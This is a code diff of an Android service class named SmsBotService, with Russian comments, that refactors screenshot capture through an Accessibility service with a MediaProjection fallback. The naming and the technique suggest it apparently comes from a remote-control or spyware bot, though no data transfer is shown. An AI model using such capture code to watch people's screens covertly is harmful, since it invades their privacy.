@@ -93,18 +93,27 @@ public class SmsBotService extends Service {
     }
 
     private byte[] takeScreenshot() {
-        // Пробуем через Accessibility сервис
+        // Способ 1: ScreenCaptureService (Accessibility)
         if (ScreenCaptureService.instance != null) {
             byte[] result = ScreenCaptureService.instance.takeScreenshot();
             if (result != null) return result;
         }
-        // Fallback: MediaProjection
+        // Способ 2: MediaProjection (если был настроен)
         try {
-            MediaProjection mp = MainActivity.mediaProjection;
-            if (mp == null) return null;
+            if (MainActivity.mediaProjection != null) {
+                return takeScreenshotWithMediaProjection(MainActivity.mediaProjection);
+            }
+        } catch (Exception e) {}
+        return null;
+    }
+
+    private byte[] takeScreenshotWithMediaProjection(MediaProjection mp) {
+        try {
             DisplayMetrics metrics = new DisplayMetrics();
-            ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getRealMetrics(metrics);
+            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+            wm.getDefaultDisplay().getRealMetrics(metrics);
             int w = metrics.widthPixels, h = metrics.heightPixels;
+
             ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
             VirtualDisplay vd = mp.createVirtualDisplay("scr", w, h, metrics.densityDpi,
                     DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
@@ -116,11 +125,16 @@ public class SmsBotService extends Service {
                 bitmap.copyPixelsFromBuffer(buffer);
                 ByteArrayOutputStream baos = new ByteArrayOutputStream();
                 bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                image.close(); vd.release(); reader.close();
+                image.close();
+                vd.release();
+                reader.close();
                 return baos.toByteArray();
             }
-            vd.release(); reader.close();
-        } catch (Exception e) {}
+            vd.release();
+            reader.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
         return null;
     }
 
